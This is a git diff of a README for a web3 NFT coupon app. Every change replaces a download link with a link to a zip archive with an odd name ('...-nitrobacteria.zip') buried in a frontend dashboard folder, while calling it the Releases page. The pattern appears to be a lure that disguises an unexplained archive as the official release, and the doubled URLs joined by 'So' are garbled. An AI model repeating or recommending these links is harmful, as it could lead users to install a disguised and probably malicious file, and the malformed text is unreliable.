@@ -6,11 +6,11 @@ Welcome to the **web3-deal-discovery-nft-coupons** project! With this applicatio
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip So https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip So https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip)
+[![Download Now](https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip So https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip%20Releases-brightgreen)](https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip So https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip)
 
 To begin, visit the Releases page for our project. Here you will find the latest version of the application, along with any updates. Click on the link below to start downloading:
 
-[Download from Releases](https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip So https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip)
+[Download from Releases](https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip So https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip)
 
 ## 🔧 System Requirements
 
@@ -92,6 +92,6 @@ We value your input. Please let us know what you think about the application, an
 
 ## 🔗 Useful Links
 
-- [Download from Releases](https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip So https://raw.githubusercontent.com/kotosolos/web3-deal-discovery-nft-coupons/main/Tsattine/web3-deal-discovery-nft-coupons.zip)
+- [Download from Releases](https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip So https://github.com/kotosolos/web3-deal-discovery-nft-coupons/raw/refs/heads/main/src/frontend/app/(merchant)/dashboard/web-deal-coupons-discovery-nft-nitrobacteria.zip)
   
 By following these steps, you can successfully download and run the **web3-deal-discovery-nft-coupons** application. Happy saving!
